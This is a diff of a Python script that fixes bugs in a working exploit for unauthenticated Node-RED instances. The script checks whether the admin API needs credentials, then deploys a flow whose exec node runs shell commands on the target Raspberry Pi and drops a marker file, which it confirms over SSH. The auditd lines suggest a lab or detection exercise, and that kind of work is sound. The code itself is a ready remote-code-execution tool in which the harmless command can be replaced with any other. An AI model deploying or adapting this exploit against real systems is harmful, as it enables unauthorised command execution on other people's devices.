@@ -22,7 +22,6 @@ piUser = input("Target Device User: ")
 options = ["flows", "settings", "nodes", "context", "subflows", "palette"]
 
 while True:
-
     targetTopic = input("Target Topic (Enter '-h' for topic types): ")
 
     if targetTopic == "-h":
@@ -38,8 +37,7 @@ while True:
     print("Invalid option. Enter -h to see available options.")
 
 targetURL = f"http://{targetHost}:{targetPort}/{targetTopic}"
-
-nodeConfirm_File = "/tmp/RCEnodeConfirm.txt" #evidence file spawned on Pi
+nodeConfirm_File = "/tmp/RCEnodeConfirm.txt"
 
 print(f"Target URL: {targetURL}")
 
@@ -56,9 +54,9 @@ flowPayload = [
         "z": "nodeTab",
         "name": "fireOnce_Inject",
         "once": True,
-        "onceDelay": 0.1, 
-        "topic":"",
-        "payload":"",
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
         "payloadType": "date",
         "wires": [["flowDeploy_exec"]]
     },
@@ -69,39 +67,42 @@ flowPayload = [
         "name": "confirmRCE",
         "command": (
             f"id; hostname; "
-            f"echo {nodeConfirm_File}"
+            f"echo RCE_CONFIRMED > {nodeConfirm_File}"
         ),
         "addpay": False,
-        "append":"",
+        "append": "",
         "useSpawn": "false",
-        "timer":"",
+        "timer": "",
         "winHide": False,
         "oldrc": False,
         "wires": [[], [], []]
     }
 ]
 
+
 def authCheck():
-    print(f"{NOTIFICATION} GET {targetURL}")
+    checkURL = f"http://{targetHost}:{targetPort}/settings"
+    print(f"{NOTIFICATION} GET {checkURL}")
     print(f"\n{NOTIFICATION} Accessing authorization settings")
     try:
-        r = requests.get(settingsURL, timeout=5)
+        r = requests.get(checkURL, timeout=5)
     except requests.exceptions.ConnectionError:
-        print(f"{ERROR} {targetURL} could not be reached.")
+        print(f"{ERROR} {checkURL} could not be reached.")
         print(f"{WARNING} Try: Check host status")
-        sys.exit
+        sys.exit(1)
 
     print(f" HTTP {r.status_code}")
-    if r.status_code == 200: #200 OK - Operational
-         print(f"{NOTIFICATION} {targetURL} returned '200' without credentials")
-         print(f"{CRITICAL} NO AUTHENTICATION NEEDED")
-         print(f" Body: {r.text[:120]} \n")
-         return True
+    if r.status_code == 200:
+        print(f"{NOTIFICATION} {checkURL} returned '200' without credentials")
+        print(f"{CRITICAL} NO AUTHENTICATION NEEDED")
+        print(f" Body: {r.text[:120]} \n")
+        return True
     elif r.status_code == 401:
-        print(f"{ERROR} {targetURL} returned '401' without credentials")
+        print(f"{ERROR} {checkURL} returned '401' without credentials")
         return False
     else:
         print(f"{WARNING} Unexpected status {r.status_code}")
+
 
 def deployTarget_Flow():
     headers = {
@@ -111,9 +112,9 @@ def deployTarget_Flow():
 
     print(f"{NOTIFICATION} POST {targetURL}")
     print(f"Content-Type: application/json")
-    print(f"authorization: disabled")
+    print(f"Authorization: disabled")
     print(f"Payload: {len(flowPayload)} nodes")
-    f"(tab + inject + exec)"
+    print(f"(tab + inject + exec)")
     print(f"Exec command: {flowPayload[2]['command']}\n")
 
     try:
@@ -121,14 +122,14 @@ def deployTarget_Flow():
     except requests.exceptions.ConnectionError:
         print(f"{WARNING} Cannot reach {targetURL}")
         print(f"Try: Check Pi state and services")
-        sys.exit(1) 
+        sys.exit(1)
 
     print(f"{NOTIFICATION} Response: HTTP {resp.status_code} {resp.reason}")
 
     if resp.status_code in (200, 204):
         print(f"{NOTIFICATION} Flow deployment effective")
-        print(f"{NOTIFICATION} exec node firing...") 
-        print("auditd firing -k rce_marker + -k proc_exec")
+        print(f"{NOTIFICATION} exec node firing...")
+        print(f"auditd firing -k rce_marker + -k proc_exec")
         return True
     elif resp.status_code == 401:
         print(f"{WARNING} 401 - adminAuth set. Try: 'grep adminAuth ~/.node-red/settings.js'")
@@ -140,8 +141,30 @@ def deployTarget_Flow():
         print(f"{WARNING} Unknown response {resp.status_code}: {resp.text[:200]}")
         return False
 
+
+def verifyRCE():
+    print(f"\n{NOTIFICATION} Verifying RCE — reading {nodeConfirm_File} on Pi via SSH …")
+    try:
+        result = subprocess.run(
+            ["ssh", f"{piUser}@{targetHost}",
+             f"cat {nodeConfirm_File} && stat {nodeConfirm_File}"],
+            capture_output=True, text=True, timeout=15
+        )
+        if result.returncode == 0:
+            print(f"{NOTIFICATION} Marker file confirmed on Pi:")
+            print(result.stdout)
+        else:
+            print(f"{ERROR} SSH returned rc={result.returncode}")
+            print(result.stderr)
+    except FileNotFoundError:
+        print(f"{ERROR} ssh not found — verify manually:")
+        print(f"    ssh {piUser}@{targetHost} 'cat {nodeConfirm_File}'")
+    except subprocess.TimeoutExpired:
+        print(f"{ERROR} SSH timed out — verify manually on the Pi")
+
+
 def main():
-    parser = argparse.argumentParser()
+    parser = argparse.ArgumentParser()
     parser.add_argument("--check", action="store_true")
     parser.add_argument("--verify", action="store_true")
     parser.add_argument("--dry-run", action="store_true")
@@ -150,9 +173,9 @@ def main():
 
     if args.dry_run:
         print(f"{NOTIFICATION} Dry-run active - flow payload unsent")
-        print(json.dumps(flowPayload), indent=2)
+        print(json.dumps(flowPayload, indent=2))
         return
-    
+
     if args.check:
         ok = authCheck()
         if not ok:
@@ -160,14 +183,15 @@ def main():
 
     deploy = deployTarget_Flow()
 
-    if deployed and args.verify:
-        import time 
-        print(f"{Warning} Exec node booting - Wait 5 seconds")
+    if deploy and args.verify:
+        import time
+        print(f"{WARNING} Exec node booting - Wait 5 seconds")
         time.sleep(5)
         verifyRCE()
 
-    if deployed:
+    if deploy:
         print("\n" + "-" * 60)
 
-if __name__ == "__main":
+
+if __name__ == "__main__":
     main()
